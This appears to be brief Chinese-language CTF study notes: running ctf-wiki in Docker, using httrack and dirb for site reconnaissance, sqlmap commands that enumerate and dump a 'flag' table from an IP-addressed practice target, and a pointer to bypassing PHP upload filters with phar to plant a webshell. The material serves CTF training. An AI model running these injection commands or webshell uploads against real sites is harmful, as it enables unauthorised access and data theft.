# CTF相关知识


## CTF概念


### 1.基本概念
https://github.com/ctf-wikiÂ

### 2.本地运行

```

docker run -d --name=ctf-wiki -p 4100:80 ctfwiki/ctf-wiki

```



## 过程类

### 工具方面

#### kali linux平台

1. httrack 下载整个网站

2. dirb 探测网站信息

dirb target_url file_config.txt -x file_extend.txt

target_url是目标url
file_config.txt 是指文件名
file_extend.txt 文件后缀，比如zip

3. sql注入

python ./sqlmap.py -u "http://150.158.88.26:27483/?id=1" --tables --random-agent

python ./sqlmap.py -u "http://150.158.88.26:27483/?id=1" -D scheme -T table –-columns

python ./sqlmap.py -u "http://150.158.88.26:27483/?id=1" -D security -T flag -C id,flag --dump


4. webshell

php上传时，如果后端做了文件格式限制，可以通过 phar方式
https://blog.csdn.net/xiaorouji/article/details/83118619


## 其他注意

在使用sqlmap 去注入目标网站时，应该是通过我司的网络出口，所以有安全防火墙挡住了，安全防火墙判断了 xss的规则，封杀了。

建议使用本机，局域网搭建ctf考核系统






## 相关网站
